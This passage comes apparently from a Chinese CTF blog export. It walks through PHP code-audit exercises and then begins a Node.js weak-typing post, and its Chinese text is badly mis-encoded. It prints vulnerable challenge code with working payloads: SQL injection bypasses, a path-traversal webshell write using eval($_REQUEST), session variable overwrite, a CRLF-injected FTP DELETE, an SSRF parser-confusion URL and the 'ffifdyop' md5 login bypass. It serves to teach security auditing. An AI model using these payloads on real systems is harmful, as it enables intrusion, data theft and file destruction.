@clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM ctf.users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';#echo $query;$result=mysql_query($query);while($row = mysql_fetch_array($result))&#123; echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $row['name'] . \"&lt;/td&gt;\"; echo \"&lt;/tr&gt;\";&#125;?&gt; è¿™é‡Œé¦–å…ˆè¦è¾¾æˆsqlæ³¨å…¥,è‡ªç„¶æ¯”è¾ƒå…³å¿ƒæ˜¯å¦èƒ½é—­åˆå•å¼•å·ã€‚ä½†æ˜¯æ³¨æ„åˆ°,æ­¤å¤„çš„htmlentitiesä¸¥æ ¼è½¬ä¹‰äº†å•åŒå¼•å·ã€‚ä¸èƒ½è¿›è¡Œé—­åˆã€‚ ä½†æ˜¯ä¸ç”¨å¼•å·é—­åˆçš„å¦å¤–çš„åŠæ³•å°±æ˜¯éå¸¸å¸¸è§çš„\\è¿›è¡Œè½¬ä¹‰ã€‚è¿™æ ·passwordçš„å€¼å°±å˜æˆå¯æ§çš„æ³¨å…¥ä½ç½®äº†ã€‚ æ¥ä¸‹æ¥æ¯”è¾ƒå…³å¿ƒçš„æ˜¯ä»£ç ä¸­å¯¹usernameä¸passwordå…³é”®å­—çš„è¿‡æ»¤ã€‚è¿™é‡Œè¿‡æ»¤å¾ˆç®€å•,å…¶ä»–ç›²æ³¨ä¹‹ç±»çš„æ–¹æ³•å½“ç„¶å¯ä»¥åšåˆ°ã€‚ä¸è¿‡è¿™é‡Œå¯ä»¥ç”¨åˆ°ä¸€ä¸ªå®¹æ˜“è¢«å¿˜è®°çš„å°æŠ€å·§: php.iniä¸­é»˜è®¤å¦‚æœä»¥ POST ã€ GET æ–¹å¼ä¼ å…¥ç›¸åŒçš„å˜é‡ï¼Œé‚£ä¹ˆç”¨ REQUEST è·å–è¯¥å˜é‡çš„å€¼å°†ä¸º POST è¯¥å˜é‡çš„å€¼ æ‰€ä»¥postæ•°æ®ä¼šè¦†ç›–æ‰getçš„æ•°æ®ã€‚æˆ‘ä»¬ç”¨postä¼ æ­£å¸¸çš„payloadã€å†ç”¨getæ‰§è¡Œsqlè¯­å¥å³å¯ 123get:username&#x3D;\\&amp;password&#x3D;union select 1,flag,3,4 from ctf.users%23post: username&#x3D;1&amp;password&#x3D;2 Day13wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥ æœ¬é¢˜æ˜¾ç„¶ä»£ç ä¸­å­˜åœ¨sqlè¯­å¥æ‹¼æ¥ã€‚ä½†æ˜¯åªæœ‰ä¸€ä¸ªaddslashes,é™¤éæ˜¯äºŒæ¬¡æ³¨å…¥å¦åˆ™ä¸èƒ½åˆ©ç”¨ã€‚ç„¶è€Œä»£ç ä¸­å´å‡ºç°äº†å¾ˆå¼±æ™ºçš„æ£€æŸ¥substr(),å…¶é•¿åº¦è¢«å®šæ­»ä¸º20.é‚£ä¹ˆæˆ‘ä»¬åªè¦å¡åœ¨è¿™ä¸ªç‚¹ä½¿ç”¨å•å¼•å·å°±èƒ½å¯¼è‡´è½¬ä¹‰å¤±æ•ˆäº† 1user&#x3D;1234567890123456789&#39;&amp;passwd&#x3D;or 1&#x3D;1# åœ¨æŸCMSä¸­,å¯¹sqlè¯­å¥è¿›è¡Œäº†htmlentiteså¤„ç†ã€‚ä½†æ˜¯åŒæ—¶æ•°æ®åœ¨ä¼ å…¥å‰ä¼šè¿›è¡Œä¸€æ¬¡urldecodeã€‚æˆ‘ä»¬çŸ¥é“,åœ¨wafæ£€æµ‹åå†è¿›è¡Œè§£ç æ“ä½œæ— ç–‘æ˜¯å…·æœ‰å±å®³æ€§çš„ã€‚(æ¯”å¦‚json_deocdeå¦‚æœåœ¨wafæ£€æµ‹ä¹‹åçš„è¯,å°±èƒ½ç”¨unicodeç»•è¿‡ä»»æ„å­—ç¬¦waf) ç»ƒä¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//index.php&lt;?phprequire 'db.inc.php'; function dhtmlspecialchars($string) &#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = dhtmlspecialchars($val); &#125; &#125; else &#123; $string = str_replace(array('&amp;', '\"', '&lt;', '&gt;', '(', ')'), array('&amp;amp;', '&amp;quot;', '&amp;lt;', '&amp;gt;', 'ï¼ˆ', 'ï¼‰'), $string); if (strpos($string, '&amp;amp;#') !== false) &#123; $string = preg_replace('/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/', '&amp;\\\\1', $string); &#125; &#125; return $string; &#125; function dowith_sql($str) &#123; $check = preg_match('/select|insert|update|delete|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile/is', $str); if ($check) &#123; echo \"éæ³•å­—ç¬¦!\"; exit(); &#125; return $str; &#125; // ç»è¿‡ç¬¬ä¸€ä¸ªwafå¤„ç† foreach ($_REQUEST as $key =&gt; $value) &#123; $_REQUEST[$key] = dowith_sql($value); &#125; // ç»è¿‡ç¬¬äºŒä¸ªWAFå¤„ç† $request_uri = explode(\"?\", $_SERVER['REQUEST_URI']); if (isset($request_uri[1])) &#123; $rewrite_url = explode(\"&amp;\", $request_uri[1]); foreach ($rewrite_url as $key =&gt; $value) &#123; $_value = explode(\"=\", $value); if (isset($_value[1])) &#123; $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1])); &#125; &#125; &#125; // ä¸šåŠ¡å¤„ç† if (isset($_REQUEST['submit'])) &#123; $user_id = $_REQUEST['i_d']; $sql = \"select * from ctf.users where id=$user_id\"; $result=mysql_query($sql); while($row = mysql_fetch_array($result)) &#123; echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $row['name'] . \"&lt;/td&gt;\"; echo \"&lt;/tr&gt;\"; &#125; &#125;?&gt; è¿™ä¸ªç»ƒä¹ å¾ˆæœ‰è¥å…»ã€‚ç”¨åˆ°äº†å‡ ä¸ªphpçš„ç‰¹æ€§1.ä¼ å…¥çš„éæ³•çš„ $_GET æ•°ç»„å‚æ•°å,PHPä¼šå°†ä»–ä»¬æ›¿æ¢æˆä¸‹åˆ’çº¿2.ä¼ å…¥å¤šä¸ªç›¸åŒå‚æ•°æ—¶,phpåªä¼šæ¥å—æœ€åä¸€ä¸ª(ç±»ä¼¼jsäº†)3.$_SERVER[&#39;REQUEST_URI&#39;]æ–¹å¼è·å¾—çš„å‚æ•°ï¼Œå¹¶ä¸ä¼šå¯¹å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢ æœ¬é¢˜ä»£ç ä¸­,$_REQUESTçš„æ•°æ®ä¼šç»è¿‡dowith_sqlå¤„ç†ã€‚è€Œä¹‹åç¬¬äºŒä¸ªwafä¼šå¯¹$_SERVER[&#39;REQUEST_URI&#39;]è¿›è¡Œdhtmlspecialchars()å¤„ç†. é‚£ä¹ˆæ­¤å¤„æ€è·¯å¦‚ä¸‹,ä½¿ç”¨payloadi_d=padyload&amp;i.d=123ç»è¿‡ç¬¬ä¸€æ¬¡wafæ—¶ï¼Œphpä¼šå°†å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šç¬¦å·æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ã€‚å› æ­¤ä¾¿å¾—åˆ°äº†ä¸¤ä¸ªi_d,å…¶ä¸­ä¸å«æ¶æ„ä»£ç çš„i_då†…å®¹é€šè¿‡æ£€æŸ¥ã€‚ç»è¿‡ç¬¬äºŒæ¬¡wafæ—¶,ç”±äºä»£ç æ˜¯é€šè¿‡ $_SERVER[â€˜REQUEST_URIâ€™] å–å‚æ•°.æ£€æŸ¥çš„å®é™…ä¸Šæ˜¯æˆ‘ä»¬åˆå§‹ä¼ å…¥çš„payloadã€‚è¿™é‡Œç”±äºæ˜¯æ•°å€¼å‹æ³¨å…¥,æ‰€ä»¥å¯ä»¥ç›´æ¥unionå¾—åˆ°flag payload 1submit&#x3D;&amp;i_d&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.users&amp;i.d&#x3D;123 Day14å˜é‡è¦†ç›–+è·¯å¾„ç©¿è¶Š è¿™é‡Œçš„ä»£ç åœ¨ææ„å‡½æ•°é‡Œæœ‰å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚å› æ­¤åªè¦idå¯æ§å°±èƒ½æ§åˆ¶è·¯å¾„ã€‚åŒæ—¶çœ‹åˆ°æ„é€ å‡½æ•°é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆåˆ©ç”¨èµ·æ¥å°±ä¸éš¾äº†ã€‚payload 1id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;&#39;,)%0a&lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F; å› ä¸ºå®é™…ä¸Šå†™å…¥çš„å†…å®¹æ˜¯ï¼š 1234567array( &#39;id&#39;&#x3D;&gt;&#39;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;, &#39;lost&#39;&#x3D;&gt;0, &#39;bought&#39;&#x3D;&gt;0, &#39;shell&#39;&#x3D;&gt;&#39;\\&#39;,) &lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;&#39;,) æ‰€ä»¥éœ€è¦å…ˆé—­åˆ,æ¢è¡Œåå†™shellæ³¨é‡Šå³å¯ã€‚ æŸCMSä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„å˜é‡è¦†ç›–æ¼æ´ã€‚æ¯”å¦‚éœ€è¦adminæƒé™,è€Œadminæƒé™æ˜¯ç”±sessionæ•°ç»„çš„å€¼å†³å®šçš„ã€‚å› æ­¤å¯ä»¥ç›´æ¥_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1è¦†ç›–ã€‚å½“ç„¶,å‰ææ˜¯å½“å‰çš„phpå¼€å¯äº†session_start() Day15PHP_SELF å…³äº$_SERVER[&#39;PHP&#39;]:PHP_SELFæŒ‡å½“å‰çš„é¡µé¢ç»å¯¹åœ°å€,å®ƒæ˜¯å¯ä»¥æ§åˆ¶çš„. åŒæ—¶ä»£ç ä¸­è°ƒç”¨äº†ä¸€æ¬¡urldecode,åŠ ä¸Šæµè§ˆå™¨è‡ªå¸¦çš„ä¸€æ¬¡è§£ç ,å°±å¯ä»¥é€šè¿‡äºŒæ¬¡urlç¼–ç è¿›è¡Œå…³é”®å­—ç»•è¿‡http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123æ­¤å¤„payloadå³å¯è¾¾æˆ302è·³è½¬ PHP_SELFè¿™ä¸ªè€ƒç‚¹ä¹‹å‰zer0ptsçš„é¢˜ç›®ä¸­ä¹Ÿæœ‰å‡ºç°è¿‡ ç»ƒä¹ 123456789101112131415161718192021222324252627282930// index.php&lt;?php include \"./config.php\";include \"./flag.php\";error_reporting(0);$black_list = \"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\\'|\";$black_list .= \"=|_| |in|&lt;|&gt;|-|chal|_|\\.|\\(\\)|#|and|if|database|where|concat|insert|having|sleep/i\";if(preg_match($black_list, $_GET['user'])) exit(\":P\"); if(preg_match($black_list, $_GET['pwd'])) exit(\":P\"); $query=\"select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'\";echo \"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;\";$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row['user']) echo \"&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;\";&#125;$result = $conn-&gt;query(\"select pwd from users where user='admin'\");if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row['pwd'];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET['pwd']))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; æ²¡å•¥æ„æ€â€¦è·Ÿä¹‹å‰æ ¡èµ›çš„å¥—è·¯é¢˜ä¸€æ ·çš„ã€‚regexpè¿›è¡Œæ³¨å…¥;%00æ¥æ³¨é‡Šã€‚ Day16$_REQUEST æœ¬é¢˜ä¸»è¦æ˜¯ä¸€ä¸ª$_REQUESTçš„ä¾‹å­ã€‚ä»é¢˜ç›®é€»è¾‘ä¸Šçœ‹,é¦–å…ˆå¯ä»¥çŸ¥é“æ˜¯è¿›è¡Œäº†ä¸€æ¬¡ftpçš„è¿æ¥,åŒæ—¶ç”¨intvalæ¥è¯•å›¾å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚çœ‹ä¼¼æ— æ³•ç»•è¿‡ã€‚ä½†æ˜¯å®é™…è¾“å‡ºä¸‹å°±ä¼šå‘ç°æœ‰è¹Šè··: $_REQUESTçš„å†…å®¹ä¸å—è¿‡æ»¤å‡½æ•°å½±å“ã€‚æ‰€ä»¥è™½ç„¶$_REQUEST å†…å®¹æ˜¯ä¸Šè¿°ä¸‰ä¸ªå…¨å±€å˜é‡çš„åˆé›†,ä½†å®é™…ä¸Šæ˜¯ä¸ä¼šå—å½±å“çš„ã€‚ payload 1?mode&#x3D;1%0a%0dDELETE%20test.file 1å¯ä»¥è¾¾æˆmodeçš„åˆ¤æ–­ã€‚è€Œåç»­çš„æ•°æ®é€šè¿‡crlfè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚åˆ é™¤äº†æ–‡ä»¶ã€‚ å› æ­¤,éœ€è¦æ³¨æ„$_REQUESTçš„ä½¿ç”¨ã€‚å‡å¦‚åªå¯¹GET,POST,COOKIEä¸‰ç§è¿›è¡Œè¿‡æ»¤å´åœ¨ä»£ç ä¸­æ‹¼æ¥REQUESTæ˜¯ä¸å¯å–çš„ã€‚ ç»ƒä¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// index.php&lt;?phpfunction check_inner_ip($url)&#123; $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result)&#123; die('url fomat error1'); &#125; try&#123; $url_parse=parse_url($url); &#125; catch(Exception $e)&#123; die('url fomat error2'); &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long('0.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url))&#123; echo $url.' is inner ip'; &#125; else&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url'])&#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125;&#125;$url = $_POST['url'];if(!empty($url))&#123; safe_request_url($url);&#125;else&#123; highlight_file(__file__);&#125;//flag in flag.php ?&gt; 1234567891011121314151617181920212223242526272829// flag.php&lt;?phpif (! function_exists('real_ip') ) &#123; function real_ip() &#123; $ip = $_SERVER['REMOTE_ADDR']; if (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_X_FORWARDED_FOR']) &amp;&amp; preg_match_all('#\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) &#123; foreach ($matches[0] AS $xip) &#123; if (!preg_match('#^(10|172\\.16|192\\.168)\\.#', $xip)) &#123; $ip = $xip; break; &#125; &#125; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_CLIENT_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_CLIENT_IP'])) &#123; $ip = $_SERVER['HTTP_CLIENT_IP']; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_CF_CONNECTING_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) &#123; $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_X_REAL_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_X_REAL_IP'])) &#123; $ip = $_SERVER['HTTP_X_REAL_IP']; &#125; return $ip; &#125;&#125;$rip = real_ip();if($rip === \"127.0.0.1\") die(\"HRCTF&#123;SSRF_can_give_you_flag&#125;\");else die(\"You IP is &#123;$rip&#125; not 127.0.0.1\");?&gt; è¿™ä¸ªåº”è¯¥å°±æ˜¯å½“åˆéƒå¸ˆå‚…ç»å…¸ssrfçš„åŸå‹äº†ã€‚è¦æ±‚ä»å†…ç½‘ip 127.0.0.1è®¿é—®flag.phpæ‰èƒ½å¾—åˆ°flag.ä½¿ç”¨çš„è‡ªç„¶æ˜¯å½“åˆblackhatpdfä¸­åˆ†äº«çš„å…³äºphpåŠcurlé—´å¯¹urlè§£æçš„å·®å¼‚ 1url&#x3D;http:&#x2F;&#x2F;foo@localhost:80@www.bycsec.top&#x2F;flag.php libcurlè®¤ç¬¬ä¸€ä¸ª@åçš„ä½œä¸ºhostã€‚phpåŠå…¶ä»–è¯­è¨€éƒ½è®¤æœ€åä¸€ä¸ª@åçš„ä½œä¸ºhost.æ‰€ä»¥å‰é¢ç»•è¿‡å†…ç½‘ipé™åˆ¶ã€‚åœ¨åé¢æˆåŠŸæ‰§è¡Œäº†curl Day17 md5 raw_output = trueè¿™å…¶å®æ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´ =&gt; å¦‚æœæåˆ° ffifdyopåº”è¯¥å°±å¾ˆç†Ÿæ‚‰äº†ã€‚ä¼ è¯´ä¸­çš„ä¸‡èƒ½å¯†ç ç»•è¿‡ã€‚ è€Œä¹‹æ‰€ä»¥å­˜åœ¨è¿™ä¸ªç»•è¿‡çš„åŸå› æ˜¯md5è¿™ä¸ªå‡½æ•°ç¬¬äºŒä¸ªé€‰é¡¹å°±æ˜¯raw_outputã€‚é»˜è®¤ä¸ºfalseã€‚ä½†æ˜¯å‡å¦‚è®¾ä¸ºtrueçš„è¯MD5æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚è¿™æ ·å°±ä¼šå­˜åœ¨ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ã€‚å› æ­¤ ffifdyop åœ¨ç»è¿‡md5åçš„å†…å®¹æ°å¥½æ˜¯&#39;or&#39;6\\xc9]\\x99.ç¬¦åˆä¸‡èƒ½å¯†ç çš„è¦æ±‚ã€‚ æœ¬é¢˜ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚addslashesçœ‹ä¼¼ä¸èƒ½ç»•è¿‡ã€‚ä½†æ˜¯å› ä¸ºæ‹¼æ¥çš„æ˜¯md5åçš„pass.æ‰€ä»¥åªè¦æ‰¾åˆ°ä¸€ä¸ªæ•°å­—md5åçš„rawå†…å®¹åŒ…å«\\å³å¯ã€‚ payload 1user&#x3D; OR 1&#x3D;1#&amp;passwd&#x3D;128 summaryæ—¶éš”ä¸¤ä¸ªæœˆç»ˆäºåˆæŠŠauditlabsçš„å‘å¡«å®Œäº†â€¦â€¦ ä¸å¾—ä¸è¯´é‡Œé¢æ¶µç›–çš„å¾ˆå¤šphpç›¸å…³æ¼æ´éƒ½æ˜¯äº›æ–°æ‰‹åˆšåˆšå…¥é—¨å¹³å°é‡Œçš„é‚£äº›ç»å…¸é¢˜ç›®çš„åŸç†ã€‚å½“åˆæœ‰çš„åŠæ‡‚ä¸æ‡‚ï¼Œç°åœ¨ç®—æ˜¯æŠŠå‘ç»™å¡«ä¸Šäº†ã€‚ ç„¶åè‡ªå·±æœ€è¿‘æœ‰äº›çº ç»“ã€‚åŸæœ¬å› ä¸ºæ¥è§¦äº†ä¸€äº›å›½é™…èµ›åï¼Œå¼€å§‹æŠ•èº«nodejsä¸pythonç›¸å…³çš„æ¼æ´äº†ã€‚å‡ºäº†å‡ é“é¢˜ä¹Ÿéƒ½åªæ˜¯nodeè·Ÿpython.å”¯ä¸€ä¸€é“phpè¿˜æ˜¯sqlæ³¨å…¥ã€‚å¯èƒ½è‡ªå·±å¿ƒé‡Œå¯¹phpè¿˜æ˜¯è°ˆä¸ä¸Šå–œæ¬¢å§ï¼Œæ²¡æœ‰é’»ç ”ç»†èŠ‚çš„åŠ²å¤´ï¼Œæ›´æ²¡æœ‰è¿›è¡Œç›¸å…³å¼€å‘çš„æƒ³æ³•ã€‚ä½†æœ€è¿‘å¤´ä¸€æ¬¡å®æˆ˜å‘ç°phpä»æ—§æ˜¯ç½‘ç«™å¤§å¤´ä¹‹ä¸€,å¹¶ä¸”ctfæ¯”èµ›ä¸­phpè¿˜æ˜¯æœ‰ç€èƒ½å¤Ÿéš¾å€’äººçš„ç»å¯¹æ°´å‡†ã€‚å‡å¦‚æˆ‘æƒ³è¦ç»§ç»­æå‡å®åŠ›ï¼Œä»æ—§å¾—åœ¨phpä¸‹ä¸‹ä¸å°‘åŠŸå¤«ã€‚æ›´ä½•å†µçœ‹æ¡†æ¶çš„æ´å·²ç»ç®—æœ€è¿‘çš„ä¸€å¤§ä¹è¶£äº†233. æ‰€ä»¥è¯´,å¸Œæœ›è‡ªå·±è¿˜æ˜¯èƒ½èŠ±ç‚¹æ—¶é—´å»å¤šçœ‹çœ‹php.æ‰¾æ—¶é—´ç»ƒç»ƒæ‰‹ã€‚æœ€åèƒ½å¤šå‡ºå‡ ä¸ªé¢˜å°±å¥½äº†ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"å­¦ä¹ ç¬”è®°-Nodejsç›¸å…³","slug":"Nodejsçš„ä¸€äº›æŠ€å·§","date":"2020-04-20T11:43:44.000Z","updated":"2021-02-18T05:09:41.592Z","comments":true,"path":"2020/04/20/Nodejsçš„ä¸€äº›æŠ€å·§/","link":"","permalink":"https://www.bycsec.top/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/","excerpt":"æ‰“ç®—å†™å†™Nodeé‡Œé¢æœ€è¿‘é‡åˆ°çš„çŸ¥è¯†äº†ã€‚ä¸»è¦è¿˜æ˜¯è·Ÿå‘¨æœ«çš„è™ç¬¦æœ‰å…³å§ã€‚ä½œä¸ºäºŒé˜Ÿæ‰“çš„,å­¦æ ¡è™½å¦‚æœŸè¿›å…¥çº¿ä¸‹,ä½†æ˜¯è‡ªå·±è¿™æ¬¡è¿˜æ˜¯æœ‰ç‚¹å°éš¾å—ã€‚åˆ·äº†è¿™ä¹ˆå¤šé¢˜äº†,ç»“æœç¢°åˆ°ä¸¤é“å¹¶ä¸ç®—æ“…é•¿çš„Nodeé¢˜ç›®ã€‚åªåšå‡ºæ¥ç¬¬ä¸€é“é¢˜ã€‚åè¡€çš„æ˜¯ç¬¬äºŒé¢˜å½“æ—¶å¾ˆæ¸…æ¥šè‚¯å®šæ˜¯Node.jsæ²™ç›’é€ƒé€¸ï¼Œä¹ŸæŒ‰ç…§å¤§è‡´æµç¨‹æ„é€ äº†payloadï¼Œç»“æœå°±æ˜¯æ‰“ä¸é€šã€‚èµ›ååŒæ ·çš„payloadä¸Šbuuä¸€è¯•ç¬é—´æˆåŠŸæ‰§è¡Œï¼Œå¿ƒæ€ç‚¸è£‚ã€‚è€å®è¯´Nodeé¢˜ä¹Ÿç®—åšäº†ä¸å°‘æ¬¡äº†,ç›¸å…³çš„æ¼æ´é™¤äº†åŸå‹é“¾æ¯”è¾ƒç†Ÿæ‚‰å…¶ä»–çš„éƒ½ä¸æ€ä¹ˆäº†è§£ã€‚æ‰“ç®—è¿‘æœŸä¸€æ–¹é¢æŠŠç›¸å…³çš„é¢˜ç›®å¤šçœ‹ä¸‹ï¼Œç„¶åå°±æ˜¯åŸºç¡€è¯­æ³•å·©å›ºä¸‹ï¼Œå¹¶ä¸”æ€»ç»“å‡ ä¸ªé‡åˆ°çš„æœ‰ç”¨çš„trick.","text":"æ‰“ç®—å†™å†™Nodeé‡Œé¢æœ€è¿‘é‡åˆ°çš„çŸ¥è¯†äº†ã€‚ä¸»è¦è¿˜æ˜¯è·Ÿå‘¨æœ«çš„è™ç¬¦æœ‰å…³å§ã€‚ä½œä¸ºäºŒé˜Ÿæ‰“çš„,å­¦æ ¡è™½å¦‚æœŸè¿›å…¥çº¿ä¸‹,ä½†æ˜¯è‡ªå·±è¿™æ¬¡è¿˜æ˜¯æœ‰ç‚¹å°éš¾å—ã€‚åˆ·äº†è¿™ä¹ˆå¤šé¢˜äº†,ç»“æœç¢°åˆ°ä¸¤é“å¹¶ä¸ç®—æ“…é•¿çš„Nodeé¢˜ç›®ã€‚åªåšå‡ºæ¥ç¬¬ä¸€é“é¢˜ã€‚åè¡€çš„æ˜¯ç¬¬äºŒé¢˜å½“æ—¶å¾ˆæ¸…æ¥šè‚¯å®šæ˜¯Node.jsæ²™ç›’é€ƒé€¸ï¼Œä¹ŸæŒ‰ç…§å¤§è‡´æµç¨‹æ„é€ äº†payloadï¼Œç»“æœå°±æ˜¯æ‰“ä¸é€šã€‚èµ›ååŒæ ·çš„payloadä¸Šbuuä¸€è¯•ç¬é—´æˆåŠŸæ‰§è¡Œï¼Œå¿ƒæ€ç‚¸è£‚ã€‚è€å®è¯´Nodeé¢˜ä¹Ÿç®—åšäº†ä¸å°‘æ¬¡äº†,ç›¸å…³çš„æ¼æ´é™¤äº†åŸå‹é“¾æ¯”è¾ƒç†Ÿæ‚‰å…¶ä»–çš„éƒ½ä¸æ€ä¹ˆäº†è§£ã€‚æ‰“ç®—è¿‘æœŸä¸€æ–¹é¢æŠŠç›¸å…³çš„é¢˜ç›®å¤šçœ‹ä¸‹ï¼Œç„¶åå°±æ˜¯åŸºç¡€è¯­æ³•å·©å›ºä¸‹ï¼Œå¹¶ä¸”æ€»ç»“å‡ ä¸ªé‡åˆ°çš„æœ‰ç”¨çš„trick. å¼±ç±»å‹Node.jsä½¿ç”¨çš„æ˜¯javascriptçš„è¯­æ³•ã€‚ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚æ¯«æ— ç–‘é—®ä½œä¸ºå¼±ç±»å‹çš„javascriptè‡ªç„¶ä¼šæŠŠè¿™ç§ç‰¹æ€§å¸¦åˆ°æœåŠ¡ç«¯,äº§ç”Ÿä¸€äº›å¥‡æ€ªçš„æ•ˆç”¨ã€‚ ç®€å•çš„å¼±ç±»å‹çš„ä¾‹å­ 123456var a =200;var b =\"1\";var c= a + b;console.log(c);//2001 å­—ç¬¦ä¸²ä¸æ•°å­—ç»ç”±ä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦æœ€åè¿”å›çš„æ˜¯æ•°å­—ç±»å‹ã€‚ 1234var obj = &#123;name:'jack'&#125;if(obj)&#123; console.log(1);&#125; å¯¹è±¡å¯ä»¥è½¬åŒ–ä¸ºå¸ƒå°”å€¼ã€‚ 1234String.prototype.fn = function()&#123;return this&#125;;var a = 'hello';alert(typeof a.fn());alert(a.fn()); æœ¬è¯¥è¿”å›å¯¹è±¡çš„å‡½æ•°a.fn()éšå¼çš„è½¬æ¢æˆäº†å­—ç¬¦ä¸²â€œhelloâ€æ˜¾ç¤º. è¿™æ ·å°±å¯ä»¥å€Ÿç”±è™ç¬¦ç¬¬ä¸€ä¸ªeasy_loginçš„é¢˜ç›®æ¥æ¢è®¨ä¸‹nodejsçš„å¼±ç±»å‹äº†ã€‚ è¿™é“é¢˜ä¸å‡ºæ„å¤–åº”è¯¥æ˜¯æŒ‰ç…§https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter è¿™ä¸ªæ”¹çš„ã€‚åŸé¢˜è·Ÿæ­¤å¤„çš„æ ¡éªŒå‡ ä¹ä¸€æ ·ã€‚é‚£æˆ‘ä»¬æ¥çœ‹çœ‹è™ç¬¦è¿™é¢˜çš„å…³é”®æ ¡éªŒä»£ç ï¼š 123456789const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;console.log(sid)if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id');&#125;const secret = global.secrets[sid];const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); 